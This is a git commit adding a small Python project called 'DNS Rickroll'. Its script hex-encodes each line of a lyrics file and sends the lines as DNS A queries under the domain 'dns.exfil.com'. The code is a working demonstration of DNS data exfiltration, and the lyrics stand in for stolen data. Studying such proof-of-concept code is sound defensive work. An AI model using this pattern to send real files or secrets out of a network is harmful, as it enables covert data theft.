a2214a254c07e20148fc0e2484697720f39e6db4
doyler <dev@doyler.net>
2017-02-28 16:45:04 -0500

    DNS Rickroll initial commit

---
+++ DNSRickroll/README.md
@@ -0,0 +1,9 @@
+
+# Features
+* Converting the lyrics to https://www.youtube.com/watch?v=dQw4w9WgXcQ to ASCII Hex and sending DNS requests to the specified domain.
+
+
+# TODO
+* Add support for more lyrics
+* Dynamically shorten the lines (increase throughput + allow alternative files)
+* View page to lookup results
---
+++ DNSRickroll/dnsRickroll.py
@@ -0,0 +1,16 @@
+import dns.resolver
+import urllib
+
+myResolver = dns.resolver.Resolver()
+domain = "dns.exfil.com"
+
+with open('lyrics.txt') as f:
+    content = f.readlines()
+    content = [x.strip() for x in content] 
+
+for line in content:
+    hex = ''.join("{:02x}".format(ord(c)) for c in line)
+    #print hex
+    #print len(hex)
+
+    query = myResolver.query(hex + "." + domain, "A")
